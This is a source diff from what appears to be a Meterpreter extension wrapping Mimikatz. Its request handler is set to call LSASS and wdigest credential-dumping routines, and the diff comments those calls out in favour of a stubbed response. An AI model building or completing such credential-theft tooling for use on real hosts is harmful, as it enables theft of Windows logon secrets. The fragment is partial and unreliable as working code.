@@ -36,31 +36,26 @@ EnableDelayLoadMetSrv();
 
 DWORD request_boiler(Remote *remote, Packet *packet)
 {
-	packet_transmit_response(0, remote, packet);
-	FILE *ficheiro = fopen("c:\\test.txt", "wb");
-	fclose(ficheiro);
-	std::wofstream logFile( "c:\\out.txt"); 
-    std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf());
-	std::wstreambuf *errbuf = std::wcerr.rdbuf(logFile.rdbuf());
+	Packet * response = packet_create_response(packet);
+	bool result = 0;
+	//std::wofstream logFile( "c:\\out.txt"); 
+    //std::wstreambuf *outbuf = std::wcout.rdbuf(logFile.rdbuf());
+	//std::wstreambuf *errbuf = std::wcerr.rdbuf(logFile.rdbuf());
 
 	vector<wstring> * mesArguments = new vector<wstring>();
 
-	mimikatz * myMimiKatz = new mimikatz(mesArguments);
+	//mimikatz * myMimiKatz = new mimikatz(mesArguments);
 
 	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
-	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData, wstring(L"wdigest")));
-
+	//result = mod_mimikatz_sekurlsa_wdigest::getWDigest(mesArguments);
+	/*
 	if  (mod_mimikatz_sekurlsa::searchLSASSDatas())
 	{
 		mod_mimikatz_sekurlsa::getLogonData(mesArguments, &monProvider);
-	}
-
-	std::wcout.rdbuf(outbuf); 
-	std::wcerr.rdbuf(errbuf); 
-
-	packet_transmit_response(0, remote, packet);
-
-	return 0;
+	}*/
+	
+	packet_transmit_response(result, remote, response);
+	return ERROR_SUCCESS;	
 }
 
 Command customCommands[] =
